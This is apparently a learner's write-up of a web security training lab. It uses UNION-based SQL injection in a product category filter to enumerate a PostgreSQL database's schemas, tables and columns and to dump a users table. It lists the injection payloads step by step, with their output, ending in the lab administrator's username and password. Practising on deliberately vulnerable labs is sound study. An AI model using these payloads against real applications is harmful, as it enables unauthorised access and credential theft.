
Lab: SQL injection attack, listing the database contents on non-Oracle databases

---

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

---

1/ Determine the number of columns

' UNION SELECT NULL--
' UNION SELECT NULL, NULL--


2/ Determine the data type of columns

' UNION SELECT 'AAA', 'AAA'--


3/ Determine the type and version of the database

' UNION SELECT NULL, version()--
		PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)


4/ Determine the schema names in the database

' UNION SELECT NULL, schema_name FROM information_schema.schemata--
		pg_catalog
		public
		information_schema


5/ Determine the table names in the database

' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='public'--
		users_asobbt
		products


6/ Determine the column names in the database

' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users_asobbt'--
		username_tdfarj
		password_blgfiu
		email


7/ Determine the data

' UNION SELECT username_tdfarj, password_blgfiu FROM users_asobbt--
		administrator
		z8783l3xmggl9kek11yl

